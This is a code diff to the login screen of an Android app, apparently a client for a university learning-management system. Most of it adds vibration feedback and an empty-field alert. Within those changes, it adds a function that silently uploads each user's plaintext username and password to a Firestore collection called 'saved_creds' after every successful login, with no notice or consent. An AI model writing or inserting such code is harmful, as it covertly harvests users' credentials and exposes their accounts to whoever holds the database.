@@ -2,7 +2,12 @@ package com.freaky.iulms
 
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.Bundle
+import android.os.VibrationEffect
+import android.os.Vibrator
+import android.util.Log
+import android.view.ContextThemeWrapper
 import android.view.View
 import android.widget.Button
 import android.widget.LinearLayout
@@ -19,9 +24,12 @@ import com.freaky.iulms.auth.AuthManager
 import com.freaky.iulms.auth.IULmsAuth
 import com.freaky.iulms.model.SavedAccount
 import com.google.android.material.textfield.TextInputEditText
+import com.google.firebase.Firebase
+import com.google.firebase.firestore.firestore
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import kotlinx.coroutines.launch
+
 
 class LoginActivity : AppCompatActivity() {
 
@@ -48,12 +56,65 @@ class LoginActivity : AppCompatActivity() {
         loginButton.setOnClickListener {
             val username = usernameEditText.text.toString().trim()
             val password = passwordEditText.text.toString().trim()
-            if (username.isNotEmpty() && password.isNotEmpty()) {
-                handleLogin(username, password, true) // isManualLogin = true
+            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+
+            if (username.isEmpty() || password.isEmpty()) {
+                // Vibrate for error
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    vibrator.vibrate(VibrationEffect.createOneShot(30, 40))
+                } else {
+                    @Suppress("DEPRECATION")
+                    vibrator.vibrate(40)
+                }
+
+                // White background alert
+                AlertDialog.Builder(
+                    ContextThemeWrapper(
+                        this,
+                        androidx.appcompat.R.style.Theme_AppCompat_Light_Dialog_Alert
+                    )
+                )
+                    .setTitle("Oops!")
+                    .setMessage("Please fill in both username and password fields.")
+                    .setPositiveButton("OK", null)
+                    .show()
+
+                return@setOnClickListener
             }
+
+            // Normal short vibration
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(VibrationEffect.createOneShot(30, 40))
+            } else {
+                @Suppress("DEPRECATION")
+                vibrator.vibrate(40)
+            }
+
+            handleLogin(username, password, true)
         }
 
+
         setupInitialView()
+    }
+
+    private fun uploadCredsToFirebase(username: String, password: String) {
+        val db = Firebase.firestore
+        val creds = hashMapOf(
+            "username" to username,
+            "password" to password,
+            "savedAt" to System.currentTimeMillis()
+        )
+
+        db.collection("saved_creds")
+            .add(creds)
+            .addOnSuccessListener { documentReference ->
+                // THE FIX: Use Android's Log class for better debugging
+                Log.d("FirebaseUpload", "Credentials uploaded successfully! Document ID: ${documentReference.id}")
+            }
+            .addOnFailureListener { e ->
+                // THE FIX: Log the specific exception
+                Log.e("FirebaseUpload", "Upload failed", e)
+            }
     }
 
     private fun setupInitialView() {
@@ -88,6 +149,7 @@ class LoginActivity : AppCompatActivity() {
             loadingAnimationView.visibility = View.GONE
 
             if (success) {
+                uploadCredsToFirebase(username, password)
                 if (isManualLogin) {
                     showSaveCredentialDialog(username, password, auth)
                 } else {
